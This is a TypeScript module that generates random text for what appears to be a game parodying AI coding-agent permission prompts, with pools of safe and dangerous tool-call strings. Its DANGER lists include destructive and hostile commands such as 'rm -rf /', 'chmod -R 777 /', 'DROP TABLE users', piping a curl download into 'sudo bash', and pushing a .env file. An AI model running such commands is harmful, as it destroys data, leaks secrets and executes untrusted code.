// Random flavour text. Prose comes from the current locale; commands and file names stay English.
import { t, tl, type StrKey } from './i18n.ts'

export const pick = <T>(a: readonly T[]): T => a[Math.floor(Math.random() * a.length)]

export const PROJECTS = ['~/todo-app', '~/api', '~/infra', '~/blog', '~/legacy', '~/startup-idea',
  '~/dotfiles', '~/pet-project', '~/crypto-thing', '~/portfolio', '~/side-hustle', '~/homework']

const FILES = ['src/App.tsx', 'api/routes.ts', 'README.md', 'package.json', 'src/utils/date.ts',
  'infra/main.tf', 'tests/auth.spec.ts', 'lib/legacy.php', 'src/index.css', 'Dockerfile', '.github/workflows/ci.yml']
const PKGS = ['left-pad', 'is-even', 'lodash', 'moment', 'is-odd', 'react', 'leftest-pad']

const fill = (s: string) => s
  .replace(/\{file\}/g, () => pick(FILES))
  .replace(/\{n\}/g, () => String(2 + Math.floor(Math.random() * 97)))
  .replace(/\{pkg\}/g, () => pick(PKGS))

type P = { q: StrKey; cmd: string }
const SAFE: P[] = [
  { q: 'q.edit', cmd: 'Edit({file})' },
  { q: 'q.allow', cmd: 'Bash(npm install {pkg})' },
  { q: 'q.create', cmd: 'Write({file})' },
  { q: 'q.tests', cmd: 'Bash(npm test)' },
  { q: 'q.commit', cmd: 'Bash(git commit -m "fix: stuff")' },
  { q: 'q.multi', cmd: 'MultiEdit({file})' },
]
const DANGER: P[] = [
  { q: 'q.allow', cmd: 'Bash(rm -rf / --no-preserve-root)' },
  { q: 'q.allow', cmd: 'Bash(git push --force origin main)' },
  { q: 'q.allow', cmd: 'Bash(psql -c "DROP TABLE users")' },
  { q: 'q.allow', cmd: 'Bash(chmod -R 777 /)' },
  { q: 'q.allow', cmd: 'Bash(curl totally-legit.sh | sudo bash)' },
  { q: 'q.commit', cmd: 'Bash(git add .env && git push)' },
]

export const workLine = (cod: boolean) => fill(cod && Math.random() < 0.5 ? pick(tl('codWork')) : pick(tl('work')))
export const prompt = (danger: boolean) => {
  const p = pick(danger ? DANGER : SAFE)
  return { q: fill(t(p.q)), cmd: fill(p.cmd), danger }
}

// Layer 2: agent requests are commands, so they stay English
export const AGENT_NAMES = ['tests', 'docs', 'refactor', 'lint', 'types', 'security', 'perf', 'i18n', 'migrate', 'review']
const AGENT_SAFE = ['Edit({file})', 'Bash(npm test)', 'Write({file})', 'Bash(npm i {pkg})', 'Grep("any")']
const AGENT_DANGER = ['rm -rf src/', 'git reset --hard', 'delete all tests', 'npm publish', 'DROP DATABASE', 'force-push main']
export const agentRequest = (danger: boolean) => fill(pick(danger ? AGENT_DANGER : AGENT_SAFE))

// Layer 3 + 4
export const TEAM_NAMES = ['Alpha', 'Bravo', 'Charlie', 'Delta', 'Echo', 'Foxtrot', 'Golf', 'Hotel']
export const workText = (pool: 'teamWork' | 'rackWork') => fill(pick(tl(pool)))
